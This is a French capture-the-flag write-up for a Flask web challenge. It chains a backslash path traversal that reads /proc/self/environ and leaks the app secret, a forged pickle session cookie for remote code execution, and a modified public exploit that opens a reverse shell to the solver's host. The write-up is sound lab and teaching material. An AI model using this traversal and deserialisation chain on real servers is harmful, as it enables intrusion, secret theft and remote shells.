Web - Old is better than new
=================================

Enoncé
-----------
Dave a récemment récupéré son ancien site de blog qu'il utilisait à l'époque, fonctionnant sur un ordinateur Windows. Avec vos connaissances en sécurité modernes, pouvez-vous découvrir les vulnérabilités qui auraient pu l'exposer à une compromission à l'époque ?

Exploit
------------

Très peu de code dans cette app python : 

.. code-block:: python 

    from flask import Flask, send_from_directory, session
    import ntpath
    import os

    # Act as if we're on Windows (I can't run Windows in Docker, sadly)
    path = ntpath
    _original_join = os.path.join
    os.path.join = lambda *parts: _original_join(*parts).replace("\\", "/")

    app = Flask(__name__)
    app.secret_key = os.environ.get("APP_SECRET")
    PUBLIC_DIR = os.path.join(os.path.dirname(__file__), "public")

    @app.route("/")
    @app.route("/<path:path>")
    def serve(path=None):
        return send_from_directory(PUBLIC_DIR, path or "index.html")

    if __name__ == "__main__":
        app.run(host="0.0.0.0", port=8000)


On peut tout de suite supposer qu'il y a une LFI via le replace de \ en / et l'utilisation de send_from_directory

On trouve rapidement notre LFI : 

.. code-block:: console
    
    https://old-is-better-than-new.fcsc.fr/..\..\..\..\proc\self\environ

On obtient la clé secrète de l'application flask : APP_SECRET=ce9fbd88ac4eec98482b6aaf623adee54060b1ef477c677437a1982fbda0e4ac

On peut maintenant forger des cookies, mais pourquoi faire ? 

Après plusieurs recherches sur werkzeug et flask on tombe sur : 

Dans Flask 0.10 : "Changed default cookie serialization format from pickle to JSON to limit the impact an attacker can do if the secret key leaks."

On se comprend donc qu'il y a une désérialisation via pickle

Puis force de recherche on tombe sur : https://www.reddit.com/r/flask/comments/17d4o1/the_dangers_of_deserializing_pickle_objects_and/?rdt=52911 

Qui indique ce site : https://web.archive.org/web/20141026081720/http://vudang.com/2013/01/python-web-framework-from-lfr-to-rce/ 

Et qui contient : 

.. code-block:: console
    
    Flask / Werkzeug ( by default, flash use werkzeug session API that's why we have it here. ): Flask implicitly calls session unserialization if the config['SECRET_KEY'] is set to some value and the session_cookie_name (default='session') exists in the cookie, even if there is no session handling code in the web app (how nice, attacker can create a backdoor by adding SECRET_KEY to the config file, and the naive user will just think of it as 'important').
    
On va donc utiliser l'exploit proposé dans le Reddit : https://github.com/danghvu/pwp

Dockerfile pour python2 : 

.. code-block:: console
    
    
    FROM python:2.7
    RUN apt-get update && apt-get install -y git curl && apt-get clean
    RUN pip install requests
    COPY . /app

On modifie connback.py pour mettre notre host et notre port de reverse shell
Et on modifie la commande /bin/bash par /get_flag ici : 

.. code-block:: console
    
    shell = subprocess.call(["/get_flag"])

Commande : 

.. code-block:: console
    
    sudo docker build -t test . 
    sudo docker run -it test /bin/bash
    cd app
    python exploit.py ce9fbd88ac4eec98482b6aaf623adee54060b1ef477c677437a1982fbda0e4ac https://old-is-better-than-new.fcsc.fr/

On obtient le flag dans le reverse shell